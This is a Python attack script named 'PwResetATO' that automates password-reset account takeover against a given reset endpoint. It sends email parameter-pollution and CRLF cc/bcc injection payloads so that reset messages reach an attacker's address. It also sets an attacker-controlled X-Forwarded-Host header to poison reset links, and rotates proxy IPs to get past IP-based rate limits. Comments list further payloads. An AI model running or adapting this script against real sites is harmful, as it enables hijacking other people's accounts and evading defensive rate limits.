#!/usr/bin/env python3
import pyfiglet
import requests
import argparse
import urllib.parse


print(pyfiglet.figlet_format("PwResetATO"))


print("Example usage for attackerhost: python3 test.py -vm 'victim@email.com' -tm 'attacker@email.com' -p email -ah 10.0.2.15 -u http://10.0.2.2/ResetPassword.php")
print("Example usage for evade: python3 test.py -vm 'victim@email.com' -tm 'attacker@email.com' -p email -ah 10.0.2.15 -e -u http://10.0.2.2/ResetPassword.php")
print("Example usage for token: python3 test.py -vm 'victim@email.com' -p email -to tokenvlue -top token -u http://10.0.2.2/ResetPassword.php \n\n\n")

parser = argparse.ArgumentParser()
#parser.add_argument("-v", "--verbose", help="increase output verbosity",action="store_true")
#parser.add_argument("-em", "--emailmethod", help="email method attacks", action="store_true")
parser.add_argument("-tm", "--attackeremail", help="your attacking email",nargs='?', const=1, type=str)
parser.add_argument("-vm", "--victimemail", help="victim email / target email",nargs='?', const=1, type=str, required=True)
parser.add_argument("-ah", "--attackerhost", help="used for host fuzz",nargs='?', const=1, type=str)
parser.add_argument("-p", "--parameter", help="email name parameter", nargs='?', const=1, type=str, required=True)
parser.add_argument("-to", "--token", help="your token", nargs='?', const=1, type=str)
parser.add_argument("-top", "--tokenparam", help="token parameter name", nargs='?', const=1, type=str)
parser.add_argument("-e", "--evade", help="use ip rotation to bypass IP based rate limit",action="store_true")
parser.add_argument("-u", "--url", help="specify the url of ResetPassword",nargs='?', const=1, type=str, required=True)



args = parser.parse_args()

# this script uses the hacktricks method
#https://book.hacktricks.xyz/pentesting-web/reset-password
# email=victim@email.com&email=attacker@email.com
# email=victim@email.com%20email=attacker@email.com
# email=victim@email.com|email=attacker@email.com
# email="victim@mail.tld%0a%0dcc:attacker@mail.tld"
# email="victim@mail.tld%0a%0dbcc:attacker@mail.tld"
# email="victim@mail.tld",email="attacker@mail.tld"
#{"email":["victim@mail.tld","atracker@mail.tld"]}
#("form": {"email":"victim@email.tld","password":"12345678"})
#email=victim@email.com&code=$YOUR_TOKEN$
#  Host: attacker.com

#  Host: target.com
#  X-Forwarded-Host: attacker.com

#  Host: target.com
#  Host: attacker.com


with open('ip_list.txt','r') as handle:
    data = handle.readlines()
proxyiplist = []
for contlist in data:
    proxyiplist.append(contlist.replace("\n",""))

#proxy for burp
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

url = args.url

emailmethod = [f'{args.parameter}={args.victimemail}&{args.parameter}={args.attackeremail}' , f'{args.parameter}={args.victimemail}%20{args.parameter}={args.attackeremail}' , f'{args.parameter}={args.victimemail}|{args.parameter}={args.attackeremail}', f'{args.parameter}={args.victimemail}%0a%0dcc:{args.attackeremail}', f'{args.parameter}={args.victimemail}%0a%0bcc:{args.attackeremail}',  f'{args.parameter}={args.victimemail},{args.parameter}={args.attackeremail}']



if args.attackerhost:
    headers = {"X-Forwarded-Host": f"{args.attackerhost}"}
    if args.evade:
        exec(open("ipscrape.py").read())
        print("using ip rotation")
        for i in proxyiplist:

            for emailattacklist in emailmethod:
                try:

                    proxies = {"http": f"http://{i}", "https": f'https://{i}'}
                    print(f"using email attack method: {emailattacklist}")
                    print(f'using prxoy: {proxies}')
                    response = requests.post(url,headers=headers, data=emailattacklist, proxies=proxies, timeout=1.5)
                    print(response)
                    break
                except:
                    print("trying another proxy")


    elif args.attackerhost:
        for emailattacklist in emailmethod:
             print(f"using: {emailattacklist}")
             # for proxy debugging
             #response = requests.post(url,headers=headers, proxies = proxies, data=emailattacklist)
             response = requests.post(url,headers=headers, data=emailattacklist)
             print(response)

        print("Check your email")
    else:
        print("else")

if args.tokenparam:
    print(f"using: {args.parameter}={args.victimemail}&{args.tokenparam}={args.token}")
    # for proxy debugging
    #response = requests.post(url, proxies = proxies, data=f'{args.parameter}={args.victimemail}&{args.tokenparam}={args.token}')
    response = requests.post(url, data=f'{args.parameter}={args.victimemail}&{args.tokenparam}={args.token}')
    print(response)
    print("Check your email")

# if args.emailmethod:
#     for emailattacklist in emailmethod:
#          print(f"using: {emailattacklist}")
#          response = requests.post(url, proxies = proxies, data=emailattacklist)
#          print(response)